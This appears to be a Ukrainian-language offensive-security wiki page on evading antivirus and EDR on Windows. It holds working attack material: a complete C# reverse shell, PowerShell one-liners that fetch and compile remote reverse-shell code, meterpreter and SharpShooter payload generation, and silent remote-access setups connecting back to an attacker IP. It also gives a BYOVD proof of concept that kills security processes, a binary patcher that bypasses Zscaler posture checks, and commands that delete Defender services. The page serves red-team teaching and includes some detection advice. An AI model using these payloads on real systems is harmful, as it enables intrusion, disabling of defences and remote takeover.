Дуже ефективний спосіб не допустити отримання вашими payload Mark of The Web — упакувати їх у контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів, які **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payload у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось demo обходу SmartScreen шляхом пакування payloads у ISO-файли за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм logging у Windows, який дозволяє applications і системним компонентам **log events**. Однак він також може використовуватися security products для моніторингу та виявлення malicious activities.

Подібно до вимкнення (bypass) AMSI, також можна змусити функцію **`EtwEventWrite`** user space process негайно повертатися без logging будь-яких events. Це робиться шляхом patching функції в memory так, щоб вона одразу поверталася, фактично вимикаючи ETW logging для цього process.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Loading C# binaries у memory відомий уже досить давно і досі є дуже хорошим способом запуску ваших post-exploitation tools без виявлення AV.

Оскільки payload буде завантажено безпосередньо в memory без запису на disk, нам потрібно буде турбуватися лише про patching AMSI для всього process.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати C# assemblies безпосередньо в memory, але існують різні способи це зробити:

- **Fork\&Run**

Це передбачає **spawning нового sacrificial process**, injection вашого post-exploitation malicious code у цей новий process, виконання вашого malicious code і завершення нового process після завершення. Це має як переваги, так і недоліки. Перевага fork and run method полягає в тому, що execution відбувається **поза** process нашого Beacon implant. Це означає, що якщо щось у нашій post-exploitation action піде не так або буде виявлено, існує **значно вища ймовірність**, що наш **implant виживе.** Недолік полягає в тому, що існує **вища ймовірність** бути виявленим **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Йдеться про injection post-exploitation malicious code **у власний process**. Таким чином, можна уникнути створення нового process і його scanning за допомогою AV, але недоліком є те, що якщо під час execution вашого payload щось піде не так, існує **значно вища ймовірність** **втратити ваш beacon**, оскільки він може crashнутися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете прочитати більше про C# Assembly loading, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) і їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**; перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати malicious code за допомогою інших мов, надавши скомпрометованій machine доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries і environment на SMB share, ви можете **виконувати довільний code цими мовами в memory** скомпрометованої machine.

У repo зазначено: Defender усе ще сканує scripts, але завдяки використанню Go, Java, PHP тощо ми маємо **більше гнучкості для обходу static signatures**. Тестування випадкових не-obfuscated reverse shell scripts цими мовами виявилося успішним.

## TokenStomping

Token stomping маніпулює access token security product, такого як EDR або AV. Зменшення privileges token може залишити process запущеним, водночас не даючи йому виконувати privileged inspection або remediation actions.

Щоб запобігти цьому, Windows могла б **заборонити external processes** отримувати handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання Trusted Software

### Chrome Remote Desktop

Як описано в [**цьому blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко розгорнути Chrome Remote Desktop на PC жертви, а потім використовувати його для takeover і підтримання persistence:<sup>[[35]](#references)</sup>
1. Завантажте його з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть MSI file для Windows, щоб завантажити MSI file.
2. Тихо запустіть installer на victim (потрібні права admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Wizard попросить вас authorize; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану command із необхідними adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` встановлює PIN без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема; іноді потрібно враховувати багато різних sources of telemetry лише в одній system, тому в зрілих environments практично неможливо залишатися повністю undetected.

Кожен environment, проти якого ви дієте, матиме власні strengths і weaknesses.

Я наполегливо рекомендую переглянути цей talk від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати початкове розуміння більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудовий talk від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі techniques**

### **Перевірка, які частини Defender знаходить malicious**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини binary**, доки **не визначить, яку частину Defender** знаходить malicious, і розділить її для вас.\
Інший tool, що виконує **те саме, —** [**avred**](https://github.com/dobin/avred), із відкритим web offering цього service на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як administrator), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Налаштуйте його **запуск** під час запуску системи та **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin downloads, а не setup)

**НА HOST**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **victim**

#### **Reverse connection**

**attacker** має **запустити всередині** свого **host** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти reverse **VNC connection**. Потім на **victim**: запустіть winvnc daemon `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Для збереження stealth не слід робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тому самому каталозі, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з’явиться [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Усередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# із використанням компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для прикладу створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Знищення AV/EDR із простору ядра

Storm-2603 використала невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути endpoint-захист перед розгортанням ransomware. Інструмент приносить із собою **вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій у ядрі, які не можуть заблокувати навіть AV-сервіси Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ключові висновки
1. **Підписаний драйвер**: Файл, доставлений на диск, має назву `ServiceMouse.sys`, але бінарний файл є легітимно підписаним драйвером `AToolsKrnl64.sys` від Antiy Labs з “System In-Depth Analysis Toolkit”. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть тоді, коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **сервіс ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, які надає драйвер**
| Код IOCTL | Можливість                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершення довільного процесу за PID (використовується для знищення сервісів Defender/EDR) |
| `0x990000D0` | Видалення довільного файлу з диска |
| `0x990001D0` | Вивантаження драйвера та видалення сервісу |

Мінімальний C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**:  BYOVD повністю обходить захист user-mode; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій hardening.

Виявлення / пом’якшення
•  Увімкніть список блокування вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових *сервісів ядра* та створюйте сповіщення, коли драйвер завантажується зі спільного каталогу з правом запису або відсутній у allow-list.
•  Відстежуйте handles із user-mode до custom device objects, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід Posture Checks у Zscaler Client Connector через патчинг бінарних файлів на диску

**Client Connector** від Zscaler застосовує правила device-posture локально та використовує Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні роблять повний обхід можливим:

1. Оцінювання posture відбувається **повністю на стороні клієнта** (на сервер надсилається boolean).
2. Внутрішні RPC endpoints перевіряють лише те, що executable, який підключається, **підписаний Zscaler** (через `WinVerifyTrust`).<sup>[[11]](#references)</sup>

За допомогою **патчингу чотирьох підписаних бінарних файлів на диску** обидва механізми можна нейтралізувати:

| Бінарний файл | Пропатчена оригінальна логіка | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається compliant |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який (навіть непідписаний) процес може підключатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності tunnel | Виконання перевірок скорочено |

Фрагмент мінімального patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стеку сервісів:

* **Усі** перевірки стану відображаються як **green/compliant**.
* Непідписані або модифіковані бінарні файли можуть відкривати кінцеві точки named-pipe RPC (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як суто клієнтські рішення щодо довіри та прості перевірки підписів можна обійти за допомогою кількох byte patches.

## Зловживання trusted functionality у Microsoft Defender `BTR.sys`

Драйвер **Boot-Time Removal** у Defender є корисним контрприкладом до класичного BYOVD. `BTR.sys` — легітимний remediation-компонент Microsoft із підписом Microsoft, без memory-corruption bug і без IOCTL-інтерфейсу; після отримання адміністративного доступу та `SeLoadDriverPrivilege` оператор натомість може підробити його приватну remediation-транзакцію й отримати передбачені операції з файлами та реєстром на Ring-0. Це **post-compromise AV/EDR-neutralization primitive, а не initial access або privilege escalation**, причому драйвер можна видобути з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, замість імпортування помітного стороннього драйвера.<sup>[[36]](#references)</sup>

### Підготовка one-shot драйвера

Зазвичай Defender зберігає ресурс як файл із випадковою назвою `[a-z]{8}.sys` і реєструє kernel service з аналогічною назвою. `DriverEntry` читає значення `Args` сервісу, відкриває вказаний NTFS ADS, розшифровує та перевіряє список дій, записує feedback і після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався резидентним. Підроблений сервіс має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Потік `:changelist` містить один зашифрований RC4 blob. Проаналізовані збірки повторно використовують фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний plaintext має 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ідентифікатор транзакції, отриманий із payload), після якого розташовані null-terminated UTF-16 шлях feedback і будь-яка кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) та action-specific дані, що завершуються **рівно чотирма NUL-байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій надають доступ до таких kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема locked файл |
| 2 | `[UTF-16 path]` | Видалити порожній каталог |
| 3 | `[Flags][source][destination]` | Перемістити файл до вибраного attacker-ом protected path; порожній destination означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити registry key |
| 5 | `[Flags][key path + "\\" + value]` | Видалити registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити registry value і створити відсутні key paths |

Для actions 5 і 6 роздільником key/value у wire format є **два послідовні backslash**; path у conventional format не буде правильно розділено. Feedback file здебільшого дублює request, але перші чотири байти даних кожного елемента стають його результуючим `NTSTATUS`. Для actions 1 і 2, які не мають початкового поля flags, BTR переміщує path до чотирьох зарезервованих кінцевих байтів, щоб звільнити місце для цього status.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` і early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує повний ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і feedback stream, серіалізує/перевіряє checksum/шифрує chained actions, безпосередньо створює service registry key, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як system-start driver для `-trigger boot`. Direct registry staging оминає звичайний шлях SCM `CreateServiceW` і тому **не генерує** Event ID 7045 про встановлення service. Артефакти, запущені під час boot, згодом можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` непридатний для використання, оскільки BTR виконує файлові операції з `DriverEntry` до того, як стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою з високим пріоритетом `Boot Bus Extender` натомість виконується у Phase 1: NTFS уже доступна, але багато security drivers системного запуску та user-mode EDR services ще не ініціалізовані. Boot-start filters, як-от `WdFilter`, можуть бути вже завантажені, однак BTR може видалити їхні binaries або конфігурацію service до наступного запуску, а також видалити service executables до того, як SCM їх запустить. ELAM не усуває цю прогалину, оскільки BTR запускається після boot-start evaluation і має дійсний Microsoft signature.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. PoC додає на початок Action 1 для жорстко закодованого `\SystemRoot\Temp\BootClean.log`: BTR створює цей log, потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість evidence, а розміщення feedback у `<random>.sys:<random>.dat` дає змогу видалити driver і обидва streams одночасно.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції для виявлення з високим рівнем сигналу

Правила, що ґрунтуються лише на signature, і Microsoft vulnerable-driver blocklist не протидіють зловживанню передбаченою функціональністю BTR. Надавайте перевагу цим поведінковим кореляціям, водночас відрізняючи легітимне походження Defender від довільного launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальним для BTR staging. Особливо підозрілим є `.dat` ADS, приєднаний до того самого `.sys`, оскільки легітимний Defender зазвичай розміщує feedback у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, із відсутністю відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте відоме завантаження BTR driver з non-Defender lineage із подальшим видаленням file, приписаним `System`/PID 4, особливо для security binaries.
- **Sysmon 11 -> 23:** створюйте alert на швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; сам по собі Microsoft signature не є достатньою підставою для довіри, коли security-tool driver підготовлений через `cmd.exe`, PowerShell або невідомий process.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) застосовує ієрархію signer/level, завдяки чому лише protected processes з рівним або вищим рівнем можуть втручатися один в одного. В offensive-сценаріях, якщо ви можете легітимно запустити PPL-enabled binary і контролювати його arguments, ви можете перетворити benign functionality (наприклад, logging) на обмежений write primitive, підкріплений PPL, для запису в protected directories, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що змушує process працювати як PPL
- Цільовий EXE (і будь-які завантажені DLLs) має бути підписаний за допомогою PPL-capable EKU.
- Process має бути створений за допомогою CreateProcess із flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний protection level, який відповідає signer binary (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Неправильні levels призведуть до помилки під час створення.

Також дивіться ширший вступ до PP/PPL і LSASS protection тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти launcher
- Open-source helper: CreateProcessAsPPL (вибирає protection level і передає arguments цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний binary `C:\Windows\System32\ClipUp.exe` запускає дочірній процес і приймає параметр для запису log-файлу за вказаним caller шляхом.
- Якщо його запущено як PPL process, запис файлу відбувається з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Помічники для коротких шляхів 8.3
- Перелік коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть PPL-capable LOLBIN (ClipUp) із `CREATE_PROTECTED_PROCESS` за допомогою launcher (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху до log-файлу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо цільовий binary зазвичай відкритий або заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час boot, до запуску AV, встановивши auto-start service, який гарантовано запускається раніше. Перевірте порядок запуску під час boot за допомогою Process Monitor (boot logging).
4) Після reboot запис із підтримкою PPL відбувається до того, як AV блокує свої binaries, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад invocation (шляхи приховано/скорочено з міркувань безпеки):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp; примітив придатний для corruption, а не для точного впровадження вмісту.
